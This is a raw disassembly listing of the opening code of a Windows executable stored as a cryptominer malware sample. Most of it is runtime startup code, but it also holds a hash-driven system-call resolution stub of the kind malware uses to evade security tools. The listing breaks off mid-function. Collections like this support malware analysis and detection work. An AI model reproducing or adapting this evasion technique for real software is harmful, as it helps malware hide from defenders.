
malware_samples/miner/a8ae600d922f800e997019b60fe446a5a4d7b126981791963616bb0e3fa470b5.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	56                   	push   %rsi
   140001001:	48 83 ec 20          	sub    $0x20,%rsp
   140001005:	48 8b 05 1c a0 00 00 	mov    0xa01c(%rip),%rax        # 0x14000b028
   14000100c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001012:	48 8b 05 17 a0 00 00 	mov    0xa017(%rip),%rax        # 0x14000b030
   140001019:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000101f:	48 8b 05 12 a0 00 00 	mov    0xa012(%rip),%rax        # 0x14000b038
   140001026:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000102c:	48 8b 0d d5 9f 00 00 	mov    0x9fd5(%rip),%rcx        # 0x14000b008
   140001033:	0f b7 11             	movzwl (%rcx),%edx
   140001036:	31 c0                	xor    %eax,%eax
   140001038:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   14000103e:	75 4b                	jne    0x14000108b
   140001040:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001044:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000104b:	75 3e                	jne    0x14000108b
   14000104d:	48 01 d1             	add    %rdx,%rcx
   140001050:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   140001054:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000105a:	74 17                	je     0x140001073
   14000105c:	81 fa 0b 01 00 00    	cmp    $0x10b,%edx
   140001062:	75 27                	jne    0x14000108b
   140001064:	83 79 74 0f          	cmpl   $0xf,0x74(%rcx)
   140001068:	72 21                	jb     0x14000108b
   14000106a:	48 81 c1 e8 00 00 00 	add    $0xe8,%rcx
   140001071:	eb 10                	jmp    0x140001083
   140001073:	83 b9 84 00 00 00 0f 	cmpl   $0xf,0x84(%rcx)
   14000107a:	72 0f                	jb     0x14000108b
   14000107c:	48 81 c1 f8 00 00 00 	add    $0xf8,%rcx
   140001083:	31 c0                	xor    %eax,%eax
   140001085:	83 39 00             	cmpl   $0x0,(%rcx)
   140001088:	0f 95 c0             	setne  %al
   14000108b:	48 8b 0d 8e 9f 00 00 	mov    0x9f8e(%rip),%rcx        # 0x14000b020
   140001092:	83 39 01             	cmpl   $0x1,(%rcx)
   140001095:	89 05 e9 20 2c 00    	mov    %eax,0x2c20e9(%rip)        # 0x1402c3184
   14000109b:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010a0:	83 d9 00             	sbb    $0x0,%ecx
   1400010a3:	e8 28 8e 00 00       	call   0x140009ed0
   1400010a8:	48 8b 05 d9 9f 00 00 	mov    0x9fd9(%rip),%rax        # 0x14000b088
   1400010af:	8b 30                	mov    (%rax),%esi
   1400010b1:	e8 0a 0f 00 00       	call   0x140001fc0
   1400010b6:	89 30                	mov    %esi,(%rax)
   1400010b8:	48 8b 05 b9 9f 00 00 	mov    0x9fb9(%rip),%rax        # 0x14000b078
   1400010bf:	8b 30                	mov    (%rax),%esi
   1400010c1:	e8 ea 0e 00 00       	call   0x140001fb0
   1400010c6:	89 30                	mov    %esi,(%rax)
   1400010c8:	e8 83 06 00 00       	call   0x140001750
   1400010cd:	48 8b 05 2c 9f 00 00 	mov    0x9f2c(%rip),%rax        # 0x14000b000
   1400010d4:	83 38 01             	cmpl   $0x1,(%rax)
   1400010d7:	75 0c                	jne    0x1400010e5
   1400010d9:	48 8d 0d 20 07 00 00 	lea    0x720(%rip),%rcx        # 0x140001800
   1400010e0:	e8 1b 0d 00 00       	call   0x140001e00
   1400010e5:	31 c0                	xor    %eax,%eax
   1400010e7:	48 83 c4 20          	add    $0x20,%rsp
   1400010eb:	5e                   	pop    %rsi
   1400010ec:	c3                   	ret
   1400010ed:	0f 1f 00             	nopl   (%rax)
   1400010f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010f4:	48 8b 05 95 9f 00 00 	mov    0x9f95(%rip),%rax        # 0x14000b090
   1400010fb:	8b 00                	mov    (%rax),%eax
   1400010fd:	89 05 85 20 2c 00    	mov    %eax,0x2c2085(%rip)        # 0x1402c3188
   140001103:	48 8d 05 7e 20 2c 00 	lea    0x2c207e(%rip),%rax        # 0x1402c3188
   14000110a:	48 8b 0d 6f 9f 00 00 	mov    0x9f6f(%rip),%rcx        # 0x14000b080
   140001111:	44 8b 09             	mov    (%rcx),%r9d
   140001114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001119:	48 8d 0d 6c 20 2c 00 	lea    0x2c206c(%rip),%rcx        # 0x1402c318c
   140001120:	48 8d 15 69 20 2c 00 	lea    0x2c2069(%rip),%rdx        # 0x1402c3190
   140001127:	4c 8d 05 6a 20 2c 00 	lea    0x2c206a(%rip),%r8        # 0x1402c3198
   14000112e:	e8 8d 8d 00 00       	call   0x140009ec0
   140001133:	90                   	nop
   140001134:	48 83 c4 28          	add    $0x28,%rsp
   140001138:	c3                   	ret
   140001139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001140:	48 83 ec 28          	sub    $0x28,%rsp
   140001144:	48 8b 05 d5 9e 00 00 	mov    0x9ed5(%rip),%rax        # 0x14000b020
   14000114b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001151:	e8 0a 00 00 00       	call   0x140001160
   140001156:	90                   	nop
   140001157:	90                   	nop
   140001158:	90                   	nop
   140001159:	48 83 c4 28          	add    $0x28,%rsp
   14000115d:	c3                   	ret
   14000115e:	66 90                	xchg   %ax,%ax
   140001160:	41 57                	push   %r15
   140001162:	41 56                	push   %r14
   140001164:	56                   	push   %rsi
   140001165:	57                   	push   %rdi
   140001166:	53                   	push   %rbx
   140001167:	48 83 ec 20          	sub    $0x20,%rsp
   14000116b:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001172:	00 00 
   140001174:	48 8b 78 08          	mov    0x8(%rax),%rdi
   140001178:	48 8b 35 c9 9e 00 00 	mov    0x9ec9(%rip),%rsi        # 0x14000b048
   14000117f:	31 c0                	xor    %eax,%eax
   140001181:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   140001186:	0f 94 c3             	sete   %bl
   140001189:	74 2e                	je     0x1400011b9
   14000118b:	48 39 c7             	cmp    %rax,%rdi
   14000118e:	74 29                	je     0x1400011b9
   140001190:	4c 8b 35 b9 ba 00 00 	mov    0xbab9(%rip),%r14        # 0x14000cc50
   140001197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000119e:	00 00 
   1400011a0:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a5:	41 ff d6             	call   *%r14
   1400011a8:	31 c0                	xor    %eax,%eax
   1400011aa:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   1400011af:	0f 94 c3             	sete   %bl
   1400011b2:	74 05                	je     0x1400011b9
   1400011b4:	48 39 c7             	cmp    %rax,%rdi
   1400011b7:	75 e7                	jne    0x1400011a0
   1400011b9:	48 8b 3d 90 9e 00 00 	mov    0x9e90(%rip),%rdi        # 0x14000b050
   1400011c0:	8b 07                	mov    (%rdi),%eax
   1400011c2:	83 f8 01             	cmp    $0x1,%eax
   1400011c5:	75 0c                	jne    0x1400011d3
   1400011c7:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011cc:	e8 0f 8d 00 00       	call   0x140009ee0
   1400011d1:	eb 27                	jmp    0x1400011fa
   1400011d3:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400011d6:	74 09                	je     0x1400011e1
   1400011d8:	c6 05 c1 1f 2c 00 01 	movb   $0x1,0x2c1fc1(%rip)        # 0x1402c31a0
   1400011df:	eb 19                	jmp    0x1400011fa
   1400011e1:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400011e7:	48 8b 0d 7a 9e 00 00 	mov    0x9e7a(%rip),%rcx        # 0x14000b068
   1400011ee:	48 8b 15 7b 9e 00 00 	mov    0x9e7b(%rip),%rdx        # 0x14000b070
   1400011f5:	e8 06 8d 00 00       	call   0x140009f00
   1400011fa:	8b 07                	mov    (%rdi),%eax
   1400011fc:	83 f8 01             	cmp    $0x1,%eax
   1400011ff:	75 19                	jne    0x14000121a
   140001201:	48 8b 0d 50 9e 00 00 	mov    0x9e50(%rip),%rcx        # 0x14000b058
   140001208:	48 8b 15 51 9e 00 00 	mov    0x9e51(%rip),%rdx        # 0x14000b060
   14000120f:	e8 ec 8c 00 00       	call   0x140009f00
   140001214:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   14000121a:	84 db                	test   %bl,%bl
   14000121c:	74 05                	je     0x140001223
   14000121e:	31 c0                	xor    %eax,%eax
   140001220:	48 87 06             	xchg   %rax,(%rsi)
   140001223:	48 8b 05 e6 9d 00 00 	mov    0x9de6(%rip),%rax        # 0x14000b010
   14000122a:	48 8b 00             	mov    (%rax),%rax
   14000122d:	48 85 c0             	test   %rax,%rax
   140001230:	74 10                	je     0x140001242
   140001232:	31 c9                	xor    %ecx,%ecx
   140001234:	ba 02 00 00 00       	mov    $0x2,%edx
   140001239:	45 31 c0             	xor    %r8d,%r8d
   14000123c:	ff 15 c6 4d 2c 00    	call   *0x2c4dc6(%rip)        # 0x1402c6008
   140001242:	e8 39 06 00 00       	call   0x140001880
   140001247:	48 8d 0d c2 0b 00 00 	lea    0xbc2(%rip),%rcx        # 0x140001e10
   14000124e:	ff 15 f4 b9 00 00    	call   *0xb9f4(%rip)        # 0x14000cc48
   140001254:	48 8b 0d e5 9d 00 00 	mov    0x9de5(%rip),%rcx        # 0x14000b040
   14000125b:	48 89 01             	mov    %rax,(%rcx)
   14000125e:	48 8d 0d 2b 01 00 00 	lea    0x12b(%rip),%rcx        # 0x140001390
   140001265:	e8 26 0d 00 00       	call   0x140001f90
   14000126a:	e8 01 06 00 00       	call   0x140001870
   14000126f:	48 63 3d 16 1f 2c 00 	movslq 0x2c1f16(%rip),%rdi        # 0x1402c318c
   140001276:	48 8d 0c fd 08 00 00 	lea    0x8(,%rdi,8),%rcx
   14000127d:	00 
   14000127e:	e8 ad 8c 00 00       	call   0x140009f30
   140001283:	48 89 c6             	mov    %rax,%rsi
   140001286:	48 85 ff             	test   %rdi,%rdi
   140001289:	7e 47                	jle    0x1400012d2
   14000128b:	89 fb                	mov    %edi,%ebx
   14000128d:	4c 8b 35 fc 1e 2c 00 	mov    0x2c1efc(%rip),%r14        # 0x1402c3190
   140001294:	45 31 ff             	xor    %r15d,%r15d
   140001297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000129e:	00 00 
   1400012a0:	4b 8b 0c fe          	mov    (%r14,%r15,8),%rcx
   1400012a4:	e8 a7 8c 00 00       	call   0x140009f50
   1400012a9:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ad:	48 89 f9             	mov    %rdi,%rcx
   1400012b0:	e8 7b 8c 00 00       	call   0x140009f30
   1400012b5:	4a 89 04 fe          	mov    %rax,(%rsi,%r15,8)
   1400012b9:	4b 8b 14 fe          	mov    (%r14,%r15,8),%rdx
   1400012bd:	48 89 c1             	mov    %rax,%rcx
   1400012c0:	49 89 f8             	mov    %rdi,%r8
   1400012c3:	e8 78 8c 00 00       	call   0x140009f40
   1400012c8:	49 ff c7             	inc    %r15
   1400012cb:	4c 39 fb             	cmp    %r15,%rbx
   1400012ce:	75 d0                	jne    0x1400012a0
   1400012d0:	eb 02                	jmp    0x1400012d4
   1400012d2:	31 db                	xor    %ebx,%ebx
   1400012d4:	48 c7 04 de 00 00 00 	movq   $0x0,(%rsi,%rbx,8)
   1400012db:	00 
   1400012dc:	48 89 35 ad 1e 2c 00 	mov    %rsi,0x2c1ead(%rip)        # 0x1402c3190
   1400012e3:	e8 d8 03 00 00       	call   0x1400016c0
   1400012e8:	48 8b 05 a9 1e 2c 00 	mov    0x2c1ea9(%rip),%rax        # 0x1402c3198
   1400012ef:	48 8b 0d 22 9d 00 00 	mov    0x9d22(%rip),%rcx        # 0x14000b018
   1400012f6:	48 8b 09             	mov    (%rcx),%rcx
   1400012f9:	48 89 01             	mov    %rax,(%rcx)
   1400012fc:	8b 0d 8a 1e 2c 00    	mov    0x2c1e8a(%rip),%ecx        # 0x1402c318c
   140001302:	48 8b 15 87 1e 2c 00 	mov    0x2c1e87(%rip),%rdx        # 0x1402c3190
   140001309:	4c 8b 05 88 1e 2c 00 	mov    0x2c1e88(%rip),%r8        # 0x1402c3198
   140001310:	e8 7b 2a 00 00       	call   0x140003d90
   140001315:	89 05 89 1e 2c 00    	mov    %eax,0x2c1e89(%rip)        # 0x1402c31a4
   14000131b:	83 3d 62 1e 2c 00 00 	cmpl   $0x0,0x2c1e62(%rip)        # 0x1402c3184
   140001322:	74 20                	je     0x140001344
   140001324:	80 3d 75 1e 2c 00 00 	cmpb   $0x0,0x2c1e75(%rip)        # 0x1402c31a0
   14000132b:	75 0b                	jne    0x140001338
   14000132d:	e8 be 8b 00 00       	call   0x140009ef0
   140001332:	8b 05 6c 1e 2c 00    	mov    0x2c1e6c(%rip),%eax        # 0x1402c31a4
   140001338:	48 83 c4 20          	add    $0x20,%rsp
   14000133c:	5b                   	pop    %rbx
   14000133d:	5f                   	pop    %rdi
   14000133e:	5e                   	pop    %rsi
   14000133f:	41 5e                	pop    %r14
   140001341:	41 5f                	pop    %r15
   140001343:	c3                   	ret
   140001344:	89 c1                	mov    %eax,%ecx
   140001346:	e8 d5 8b 00 00       	call   0x140009f20
   14000134b:	cc                   	int3
   14000134c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	48 8b 05 c5 9c 00 00 	mov    0x9cc5(%rip),%rax        # 0x14000b020
   14000135b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001361:	e8 fa fd ff ff       	call   0x140001160
   140001366:	90                   	nop
   140001367:	90                   	nop
   140001368:	90                   	nop
   140001369:	48 83 c4 28          	add    $0x28,%rsp
   14000136d:	c3                   	ret
   14000136e:	66 90                	xchg   %ax,%ax
   140001370:	48 83 ec 28          	sub    $0x28,%rsp
   140001374:	e8 97 8b 00 00       	call   0x140009f10
   140001379:	31 c9                	xor    %ecx,%ecx
   14000137b:	48 83 f8 01          	cmp    $0x1,%rax
   14000137f:	19 c9                	sbb    %ecx,%ecx
   140001381:	89 c8                	mov    %ecx,%eax
   140001383:	48 83 c4 28          	add    $0x28,%rsp
   140001387:	c3                   	ret
   140001388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000138f:	00 
   140001390:	c3                   	ret
   140001391:	cc                   	int3
   140001392:	cc                   	int3
   140001393:	cc                   	int3
   140001394:	58                   	pop    %rax
   140001395:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000139a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000139f:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400013a4:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400013a9:	48 83 ec 28          	sub    $0x28,%rsp
   1400013ad:	8b 0d 4d cc 00 00    	mov    0xcc4d(%rip),%ecx        # 0x14000e000
   1400013b3:	e8 98 86 00 00       	call   0x140009a50
   1400013b8:	89 05 4e cc 00 00    	mov    %eax,0xcc4e(%rip)        # 0x14000e00c
   1400013be:	48 31 c9             	xor    %rcx,%rcx
   1400013c1:	e8 3a 89 00 00       	call   0x140009d00
   1400013c6:	48 89 05 43 cc 00 00 	mov    %rax,0xcc43(%rip)        # 0x14000e010
   1400013cd:	48 31 c0             	xor    %rax,%rax
   1400013d0:	8b 05 36 cc 00 00    	mov    0xcc36(%rip),%eax        # 0x14000e00c
   1400013d6:	48 83 c4 28          	add    $0x28,%rsp
   1400013da:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400013df:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1400013e4:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1400013e9:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400013ee:	49 89 ca             	mov    %rcx,%r10
   1400013f1:	8f 05 0d cc 00 00    	pop    0xcc0d(%rip)        # 0x14000e004
   1400013f7:	ff 15 13 cc 00 00    	call   *0xcc13(%rip)        # 0x14000e010
   1400013fd:	ff 35 01 cc 00 00    	push   0xcc01(%rip)        # 0x14000e004
   140001403:	c3                   	ret
   140001404:	c7 05 f2 cb 00 00 f9 	movl   $0xb8911f9,0xcbf2(%rip)        # 0x14000e000
   14000140b:	11 89 0b 
   14000140e:	e8 81 ff ff ff       	call   0x140001394
   140001413:	c7 05 e3 cb 00 00 10 	movl   $0x3ab4610,0xcbe3(%rip)        # 0x14000e000
   14000141a:	46 ab 03 
   14000141d:	e8 72 ff ff ff       	call   0x140001394
   140001422:	c7 05 d4 cb 00 00 75 	movl   $0x6cba5e75,0xcbd4(%rip)        # 0x14000e000
   140001429:	5e ba 6c 
   14000142c:	e8 63 ff ff ff       	call   0x140001394
   140001431:	c7 05 c5 cb 00 00 04 	movl   $0xfacd7304,0xcbc5(%rip)        # 0x14000e000
   140001438:	73 cd fa 
   14000143b:	e8 54 ff ff ff       	call   0x140001394
   140001440:	c7 05 b6 cb 00 00 d5 	movl   $0x200859d5,0xcbb6(%rip)        # 0x14000e000
   140001447:	59 08 20 
   14000144a:	e8 45 ff ff ff       	call   0x140001394
   14000144f:	c7 05 a7 cb 00 00 e3 	movl   $0x827c78e3,0xcba7(%rip)        # 0x14000e000
   140001456:	78 7c 82 
   140001459:	e8 36 ff ff ff       	call   0x140001394
   14000145e:	c7 05 98 cb 00 00 2a 	movl   $0x29f02a,0xcb98(%rip)        # 0x14000e000
   140001465:	f0 29 00 
   140001468:	e8 27 ff ff ff       	call   0x140001394
   14000146d:	c7 05 89 cb 00 00 2c 	movl   $0xc852522c,0xcb89(%rip)        # 0x14000e000
   140001474:	52 52 c8 
   140001477:	e8 18 ff ff ff       	call   0x140001394
   14000147c:	c7 05 7a cb 00 00 ff 	movl   $0xa88a7eff,0xcb7a(%rip)        # 0x14000e000
   140001483:	7e 8a a8 
   140001486:	e8 09 ff ff ff       	call   0x140001394
   14000148b:	c7 05 6b cb 00 00 0a 	movl   $0xe6da9b0a,0xcb6b(%rip)        # 0x14000e000
   140001492:	9b da e6 
   140001495:	e8 fa fe ff ff       	call   0x140001394
   14000149a:	c7 05 5c cb 00 00 dd 	movl   $0xa3ab81dd,0xcb5c(%rip)        # 0x14000e000
   1400014a1:	81 ab a3 
   1400014a4:	e8 eb fe ff ff       	call   0x140001394
   1400014a9:	c7 05 4d cb 00 00 b8 	movl   $0xa92cc4b8,0xcb4d(%rip)        # 0x14000e000
   1400014b0:	c4 2c a9 
   1400014b3:	e8 dc fe ff ff       	call   0x140001394
   1400014b8:	c7 05 3e cb 00 00 54 	movl   $0xd5101854,0xcb3e(%rip)        # 0x14000e000
   1400014bf:	18 10 d5 
   1400014c2:	e8 cd fe ff ff       	call   0x140001394
   1400014c7:	c7 05 2f cb 00 00 4b 	movl   $0x11dc9e4b,0xcb2f(%rip)        # 0x14000e000
   1400014ce:	9e dc 11 
   1400014d1:	e8 be fe ff ff       	call   0x140001394
   1400014d6:	c7 05 20 cb 00 00 2f 	movl   $0x6da3f92f,0xcb20(%rip)        # 0x14000e000
   1400014dd:	f9 a3 6d 
   1400014e0:	e8 af fe ff ff       	call   0x140001394
   1400014e5:	c7 05 11 cb 00 00 21 	movl   $0xe78a5221,0xcb11(%rip)        # 0x14000e000
   1400014ec:	52 8a e7 
   1400014ef:	e8 a0 fe ff ff       	call   0x140001394
   1400014f4:	c7 05 02 cb 00 00 c0 	movl   $0xcf20a0c0,0xcb02(%rip)        # 0x14000e000
   1400014fb:	a0 20 cf 
   1400014fe:	e8 91 fe ff ff       	call   0x140001394
   140001503:	c7 05 f3 ca 00 00 b5 	movl   $0x3a5260b5,0xcaf3(%rip)        # 0x14000e000
   14000150a:	60 52 3a 
   14000150d:	e8 82 fe ff ff       	call   0x140001394
   140001512:	c7 05 e4 ca 00 00 9d 	movl   $0xfcae59d,0xcae4(%rip)        # 0x14000e000
   140001519:	e5 ca 0f 
   14000151c:	e8 73 fe ff ff       	call   0x140001394
   140001521:	c7 05 d5 ca 00 00 59 	movl   $0x3d540b59,0xcad5(%rip)        # 0x14000e000
   140001528:	0b 54 3d 
   14000152b:	e8 64 fe ff ff       	call   0x140001394
   140001530:	c7 05 c6 ca 00 00 6e 	movl   $0x521ed76e,0xcac6(%rip)        # 0x14000e000
   140001537:	d7 1e 52 
   14000153a:	e8 55 fe ff ff       	call   0x140001394
   14000153f:	c7 05 b7 ca 00 00 15 	movl   $0x8cd6715,0xcab7(%rip)        # 0x14000e000
   140001546:	67 cd 08 
   140001549:	e8 46 fe ff ff       	call   0x140001394
   14000154e:	c7 05 a8 ca 00 00 20 	movl   $0x220b9d20,0xcaa8(%rip)        # 0x14000e000
   140001555:	9d 0b 22 
   140001558:	e8 37 fe ff ff       	call   0x140001394
   14000155d:	c7 05 99 ca 00 00 17 	movl   $0x90daf417,0xca99(%rip)        # 0x14000e000
   140001564:	f4 da 90 
   140001567:	e8 28 fe ff ff       	call   0x140001394
   14000156c:	c7 05 8a ca 00 00 ab 	movl   $0xb67a02ab,0xca8a(%rip)        # 0x14000e000
   140001573:	02 7a b6 
   140001576:	e8 19 fe ff ff       	call   0x140001394
   14000157b:	c7 05 7b ca 00 00 e5 	movl   $0x1656ade5,0xca7b(%rip)        # 0x14000e000
   140001582:	ad 56 16 
   140001585:	e8 0a fe ff ff       	call   0x140001394
   14000158a:	c7 05 6c ca 00 00 2f 	movl   $0x7064ac2f,0xca6c(%rip)        # 0x14000e000
   140001591:	ac 64 70 
   140001594:	e8 fb fd ff ff       	call   0x140001394
   140001599:	c7 05 5d ca 00 00 03 	movl   $0xd0eda803,0xca5d(%rip)        # 0x14000e000
   1400015a0:	a8 ed d0 
   1400015a3:	e8 ec fd ff ff       	call   0x140001394
   1400015a8:	c7 05 4e ca 00 00 6f 	movl   $0x4ace7b6f,0xca4e(%rip)        # 0x14000e000
   1400015af:	7b ce 4a 
   1400015b2:	e8 dd fd ff ff       	call   0x140001394
   1400015b7:	c7 05 3f ca 00 00 c9 	movl   $0x198ac2c9,0xca3f(%rip)        # 0x14000e000
   1400015be:	c2 8a 19 
   1400015c1:	e8 ce fd ff ff       	call   0x140001394
   1400015c6:	c7 05 30 ca 00 00 9a 	movl   $0xd913639a,0xca30(%rip)        # 0x14000e000
   1400015cd:	63 13 d9 
   1400015d0:	e8 bf fd ff ff       	call   0x140001394
   1400015d5:	c7 05 21 ca 00 00 55 	movl   $0x5539c255,0xca21(%rip)        # 0x14000e000
   1400015dc:	c2 39 55 
   1400015df:	e8 b0 fd ff ff       	call   0x140001394
   1400015e4:	c7 05 12 ca 00 00 dd 	movl   $0x627b7ddd,0xca12(%rip)        # 0x14000e000
   1400015eb:	7d 7b 62 
   1400015ee:	e8 a1 fd ff ff       	call   0x140001394
   1400015f3:	cc                   	int3
   1400015f4:	cc                   	int3
   1400015f5:	cc                   	int3
   1400015f6:	cc                   	int3
   1400015f7:	cc                   	int3
   1400015f8:	cc                   	int3
   1400015f9:	cc                   	int3
   1400015fa:	cc                   	int3
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	48 83 ec 28          	sub    $0x28,%rsp
   140001604:	48 8b 05 0d ca 00 00 	mov    0xca0d(%rip),%rax        # 0x14000e018
   14000160b:	48 8b 00             	mov    (%rax),%rax
   14000160e:	48 85 c0             	test   %rax,%rax
   140001611:	74 2e                	je     0x140001641
   140001613:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000161a:	84 00 00 00 00 00 
   140001620:	ff 15 e2 49 2c 00    	call   *0x2c49e2(%rip)        # 0x1402c6008
   140001626:	48 8b 05 eb c9 00 00 	mov    0xc9eb(%rip),%rax        # 0x14000e018
   14000162d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001631:	48 89 0d e0 c9 00 00 	mov    %rcx,0xc9e0(%rip)        # 0x14000e018
   140001638:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000163c:	48 85 c0             	test   %rax,%rax
   14000163f:	75 df                	jne    0x140001620
   140001641:	48 83 c4 28          	add    $0x28,%rsp
   140001645:	c3                   	ret
   140001646:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000164d:	00 00 00 
   140001650:	56                   	push   %rsi
   140001651:	57                   	push   %rdi
   140001652:	53                   	push   %rbx
   140001653:	48 83 ec 20          	sub    $0x20,%rsp
   140001657:	48 8b 35 3a 9a 00 00 	mov    0x9a3a(%rip),%rsi        # 0x14000b098
   14000165e:	8b 06                	mov    (%rsi),%eax
   140001660:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001663:	75 17                	jne    0x14000167c
   140001665:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000166a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001670:	8d 48 02             	lea    0x2(%rax),%ecx
   140001673:	ff c0                	inc    %eax
   140001675:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000167a:	75 f4                	jne    0x140001670
   14000167c:	85 c0                	test   %eax,%eax
   14000167e:	74 25                	je     0x1400016a5
   140001680:	89 c7                	mov    %eax,%edi
   140001682:	48 ff cf             	dec    %rdi
   140001685:	48 89 fb             	mov    %rdi,%rbx
   140001688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000168f:	00 
   140001690:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001695:	ff 15 6d 49 2c 00    	call   *0x2c496d(%rip)        # 0x1402c6008
   14000169b:	48 ff cb             	dec    %rbx
   14000169e:	85 ff                	test   %edi,%edi
   1400016a0:	48 89 df             	mov    %rbx,%rdi
   1400016a3:	75 eb                	jne    0x140001690
   1400016a5:	48 8d 0d 54 ff ff ff 	lea    -0xac(%rip),%rcx        # 0x140001600
   1400016ac:	48 83 c4 20          	add    $0x20,%rsp
   1400016b0:	5b                   	pop    %rbx
   1400016b1:	5f                   	pop    %rdi
   1400016b2:	5e                   	pop    %rsi
   1400016b3:	e9 b8 fc ff ff       	jmp    0x140001370
   1400016b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400016bf:	00 
   1400016c0:	56                   	push   %rsi
   1400016c1:	57                   	push   %rdi
   1400016c2:	53                   	push   %rbx
   1400016c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400016c7:	80 3d da 1a 2c 00 00 	cmpb   $0x0,0x2c1ada(%rip)        # 0x1402c31a8
   1400016ce:	74 08                	je     0x1400016d8
   1400016d0:	48 83 c4 20          	add    $0x20,%rsp
   1400016d4:	5b                   	pop    %rbx
   1400016d5:	5f                   	pop    %rdi
   1400016d6:	5e                   	pop    %rsi
   1400016d7:	c3                   	ret
   1400016d8:	c6 05 c9 1a 2c 00 01 	movb   $0x1,0x2c1ac9(%rip)        # 0x1402c31a8
   1400016df:	48 8b 35 b2 99 00 00 	mov    0x99b2(%rip),%rsi        # 0x14000b098
   1400016e6:	8b 06                	mov    (%rsi),%eax
   1400016e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016eb:	75 1f                	jne    0x14000170c
   1400016ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400016f2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400016f9:	1f 84 00 00 00 00 00 
   140001700:	8d 48 02             	lea    0x2(%rax),%ecx
   140001703:	ff c0                	inc    %eax
   140001705:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000170a:	75 f4                	jne    0x140001700
   14000170c:	85 c0                	test   %eax,%eax
   14000170e:	74 25                	je     0x140001735
   140001710:	89 c7                	mov    %eax,%edi
   140001712:	48 ff cf             	dec    %rdi
   140001715:	48 89 fb             	mov    %rdi,%rbx
   140001718:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000171f:	00 
   140001720:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001725:	ff 15 dd 48 2c 00    	call   *0x2c48dd(%rip)        # 0x1402c6008
   14000172b:	48 ff cb             	dec    %rbx
   14000172e:	85 ff                	test   %edi,%edi
   140001730:	48 89 df             	mov    %rbx,%rdi
   140001733:	75 eb                	jne    0x140001720
   140001735:	48 8d 0d c4 fe ff ff 	lea    -0x13c(%rip),%rcx        # 0x140001600
   14000173c:	48 83 c4 20          	add    $0x20,%rsp
   140001740:	5b                   	pop    %rbx
   140001741:	5f                   	pop    %rdi
   140001742:	5e                   	pop    %rsi
   140001743:	e9 28 fc ff ff       	jmp    0x140001370
   140001748:	cc                   	int3
   140001749:	cc                   	int3
   14000174a:	cc                   	int3
   14000174b:	cc                   	int3
   14000174c:	cc                   	int3
   14000174d:	cc                   	int3
   14000174e:	cc                   	int3
   14000174f:	cc                   	int3
   140001750:	31 c0                	xor    %eax,%eax
   140001752:	c3                   	ret
   140001753:	cc                   	int3
   140001754:	cc                   	int3
   140001755:	cc                   	int3
   140001756:	cc                   	int3
   140001757:	cc                   	int3
   140001758:	cc                   	int3
   140001759:	cc                   	int3
   14000175a:	cc                   	int3
   14000175b:	cc                   	int3
   14000175c:	cc                   	int3
   14000175d:	cc                   	int3
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	56                   	push   %rsi
